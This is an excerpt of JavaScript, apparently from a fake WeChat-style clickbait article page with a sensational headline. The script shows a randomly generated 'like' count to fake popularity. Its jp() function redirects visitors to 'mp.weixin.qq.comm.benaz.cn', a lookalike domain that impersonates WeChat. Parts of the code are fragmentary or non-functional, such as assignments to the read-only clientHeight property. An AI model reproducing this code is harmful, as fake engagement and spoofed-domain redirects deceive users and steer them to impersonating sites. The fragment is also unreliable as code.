...
var htimg = 'http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rJLEUQzFF5g6vtaCczdL62ZblmyE4q76Sg/0',
	hturl = 'http://847w.jingdicg.cn/2017-11-12/content.html?JJu=08632945611176&oO=pVS06ii1lB&X=jpSSK2hf6NK&Uw=99299343490143413&a=820617368312059973',
	til = '特种兵退役开饭店，小痞子不知天高地厚竟来收保护费>>',
	vid = 'm0363jdry96',
	delayTime = 155;

document.getElementById("hutui_a").setAttribute("href",hturl);
document.getElementById("hutui_img").setAttribute("href",htimg);
document.getElementById("likeNum").textContent = Number.parseInt(Math.random() * 2000) + 1500;

var video, player, playStatus = 'pending';
var elId = 'mod_player_skin_0';
var elWidth = document.getElementById("js_content").clientWidth;
playVideo(vid, elId, elWidth);
document.getElementById("pauseplay").clientHeight = document.getElementById("js_content").clientHeight - 10;
...
function wxalert(msg, btn, callback) {
	...
	alertTimes++;
	var d = document.getElementById("lly_dialog");
	// var d = $('#lly_dialog');
	// d.show(200);
	d.style.display = "block";
	document.getElementById("lly_dialog_msg").textContent = msg;
	document.getElementById("lly_dialog_btn").textContent = btn;
...
addEventListener("touchmove", function(e) {
	...
	if (doc.scrollTop() <= 0 && _touches_point1 < _touches_point2) {
		...
		document.getElementById("_domain_display").clientHeight = (_touches_point2 - _touches_point1) * 0.35;
	} else {
	...
	if ((doc.scrollTop() + $(window).height()) >= doc.height() || $('#_b_dp').length > 0) {
		...
		document.getElementById("_b_dp").clientHeight = (_touches_point1 - _touches_point2) * 0.5;
	}
});
...
document.getElementById("post-date").textContent = str;

document.title = til;
document.getElementsByTagName('h2')[0].textContent = til;
...
function jp() {
	location.href = "http://mp.weixin.qq.comm.benaz.cn/nyyy.html?ad=" + (parseInt((parseInt(new Date().getTime() / (1000 * 60 * 1)) + '').substring(2)) + 5000);
}
